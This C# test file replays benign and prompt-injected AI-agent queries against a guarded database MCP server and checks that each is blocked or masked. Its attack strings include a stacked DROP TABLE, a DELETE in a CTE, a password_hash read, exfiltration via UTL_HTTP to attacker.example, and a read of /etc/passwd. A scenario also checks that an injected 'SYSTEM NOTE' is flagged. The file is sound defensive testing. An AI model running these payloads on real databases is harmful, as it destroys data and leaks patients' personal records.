using System.Globalization;
using System.Text.Json;
using System.Text.RegularExpressions;
using GuardedDbMcp.Masking;

namespace GuardedDbMcp.Demo;

/// <summary>
/// What a well-behaved agent and a prompt-injected agent would send, replayed through the real MCP endpoint.
/// Each scenario states the expected outcome; the run fails if any differs or if any response leaks a
/// checksum-valid TCKN or IBAN, a password hash or an API secret.
/// </summary>
public static partial class Scenarios
{
    public sealed record Scenario(string Name, string Tool, string? Argument, string Expect, Func<JsonElement, string?>? Check = null);

    public sealed record Outcome(Scenario Scenario, bool Passed, string Result, int Rows, double Milliseconds, string Detail);

    public static IReadOnlyList<Scenario> For(string engine)
    {
        var oracle = engine.Equals("oracle", StringComparison.OrdinalIgnoreCase);
        return
        [
            new("discover tables", "list_tables", null, "ok", j => j.GetProperty("tables").GetArrayLength() == 5 ? null : "expected 5 tables"),
            new("describe patients", "describe_table", "patients", "ok"),
            new("appointments per department", "query", "SELECT department, COUNT(*) AS n FROM appointments GROUP BY department ORDER BY n DESC", "ok"),
            new("patient contact list (masked)", "query", "SELECT id, full_name, tckn, phone, email FROM patients ORDER BY id FETCH FIRST 5 ROWS ONLY", "ok",
                j => j.GetProperty("maskedCells").GetInt32() > 0 ? null : "expected masked cells"),
            new("free-text notes are scanned", "query", "SELECT id, notes FROM appointments WHERE notes IS NOT NULL ORDER BY id FETCH FIRST 60 ROWS ONLY", "ok",
                j => j.GetProperty("detectedInValues").EnumerateObject().Any() ? null : "expected detections in notes"),
            new("row policy: only clinic 1", "query", "SELECT DISTINCT clinic_id FROM patients", "ok",
                j => j.GetProperty("rowCount").GetInt32() == 1 && j.GetProperty("rows")[0][0].GetInt64() == 1 ? null : "saw another clinic's rows"),
            new("row policy: OR 1=1 does not widen it", "query", "SELECT COUNT(*) FROM patients WHERE clinic_id = 2 OR 1 = 1", "ok"),
            new("injected note is flagged", "query", "SELECT notes FROM appointments WHERE notes LIKE 'SYSTEM NOTE%' FETCH FIRST 3 ROWS ONLY", "ok",
                j => j.GetProperty("warnings").EnumerateArray().Any(w => w.GetString()!.Contains("instructions", StringComparison.Ordinal)) ? null : "expected injection warning"),
            new("bulk read is capped", "query", "SELECT * FROM appointments", "ok",
                j => j.GetProperty("truncated").GetBoolean() ? null : "expected truncation"),
            new("ATK-01 stacked DROP", "query", "SELECT 1 FROM clinics; DROP TABLE patients", "MultipleStatements"),
            new("ATK-03 DELETE in CTE", "query", "WITH x AS (DELETE FROM patients RETURNING *) SELECT * FROM x", "NotReadOnly"),
            new("ATK-13 unlisted table", "query", "SELECT secret FROM internal_api_keys", "TableNotAllowed"),
            new("ATK-14 denied column", "query", "SELECT username, password_hash FROM staff", "ColumnDenied"),
            new("ATK-16 predicate oracle", "query", "SELECT id FROM patients WHERE tckn LIKE '1%'", "ProtectedColumnInPredicate"),
            new("ATK-19 ordering oracle", "query", "SELECT id FROM patients ORDER BY phone", "ProtectedColumnInPredicate"),
            oracle
                ? new("ATK-10 network egress", "query", "SELECT UTL_HTTP.REQUEST('http://attacker.example/') FROM dual", "FunctionNotAllowed")
                : new("ATK-06 server file read", "query", "SELECT pg_read_file('/etc/passwd')", "FunctionNotAllowed"),
            new("runaway query hits the timeout", "query", "SELECT COUNT(*) FROM appointments a CROSS JOIN appointments b CROSS JOIN appointments c", "StatementTimeout"),
        ];
    }

    public static async Task<IReadOnlyList<Outcome>> RunAsync(AgentClient client, string engine, CancellationToken cancellationToken = default)
    {
        var outcomes = new List<Outcome>();
        foreach (var s in For(engine))
        {
            var args = new Dictionary<string, object?>();
            if (s.Argument is not null)
            {
                args[s.Tool == "describe_table" ? "table" : "sql"] = s.Argument;
            }

            var started = System.Diagnostics.Stopwatch.GetTimestamp();
            var (text, json) = await client.CallAsync(s.Tool, args, cancellationToken);
            var ms = System.Diagnostics.Stopwatch.GetElapsedTime(started).TotalMilliseconds;
            var ok = s.Tool != "query" || json.GetProperty("ok").GetBoolean();
            var result = ok ? "ok" : json.GetProperty("error").GetString()!;
            var rows = s.Tool == "query" && ok ? json.GetProperty("rowCount").GetInt32() : 0;
            var problem = result != s.Expect ? $"expected {s.Expect}" : ok ? s.Check?.Invoke(json) : null;
            problem ??= Leak(text);
            outcomes.Add(new Outcome(s, problem is null, result, rows, ms, problem ?? string.Empty));
        }

        return outcomes;
    }

    /// <summary>Scans the raw response text for anything that must never reach the agent.</summary>
    public static string? Leak(string text)
    {
        foreach (Match m in ElevenDigits().Matches(text))
        {
            if (Checksums.IsValidTckn(m.Value))
            {
                return "LEAK: raw TCKN in response";
            }
        }

        foreach (Match m in IbanShape().Matches(text))
        {
            if (Checksums.IsValidIban(m.Value))
            {
                return "LEAK: raw IBAN in response";
            }
        }

        return text.Contains("$argon2id", StringComparison.Ordinal) || text.Contains("sk_test_", StringComparison.Ordinal)
            ? "LEAK: secret in response"
            : null;
    }

    public static void Print(IReadOnlyList<Outcome> outcomes, TextWriter writer)
    {
        ArgumentNullException.ThrowIfNull(outcomes);
        ArgumentNullException.ThrowIfNull(writer);
        writer.WriteLine($"{"scenario",-38} {"expected",-28} {"result",-28} {"rows",5} {"ms",8}  ");
        writer.WriteLine(new string('-', 112));
        foreach (var o in outcomes)
        {
            writer.WriteLine(string.Create(
                CultureInfo.InvariantCulture,
                $"{o.Scenario.Name,-38} {o.Scenario.Expect,-28} {o.Result,-28} {o.Rows,5} {o.Milliseconds,8:0.0}  {(o.Passed ? "PASS" : "FAIL " + o.Detail)}"));
        }
    }

    [GeneratedRegex(@"(?<!\d)\d{11}(?!\d)")]
    private static partial Regex ElevenDigits();

    [GeneratedRegex(@"TR\d{24}")]
    private static partial Regex IbanShape();
}
